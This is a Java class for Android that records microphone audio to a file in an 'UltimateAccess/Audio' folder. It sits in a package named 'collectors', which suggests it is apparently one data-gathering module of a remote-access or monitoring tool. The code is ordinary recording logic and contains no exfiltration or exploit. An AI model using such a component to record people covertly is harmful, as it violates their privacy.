package com.ultimate.access.collectors;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Environment;

import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.IOException;

public class AudioCollector {

    private Context context;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private String audioFilePath;

    public AudioCollector(Context context) {
        this.context = context;

        File audioDir = new File(Environment.getExternalStorageDirectory() + "/UltimateAccess/Audio/");
        if (!audioDir.exists()) {
            audioDir.mkdirs();
        }

        audioFilePath = audioDir.getAbsolutePath() + "/audio_" + System.currentTimeMillis() + ".3gp";
    }

    public void startRecording() {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        try {
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFilePath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void stopRecording() {
        if (mediaRecorder != null && isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
            } catch (Exception e) {
                e.printStackTrace();
            }
            mediaRecorder = null;
            isRecording = false;
        }
    }

    public boolean isRecording() {
        return isRecording;
    }

    public String getLatestAudioFile() {
        return audioFilePath;
    }
}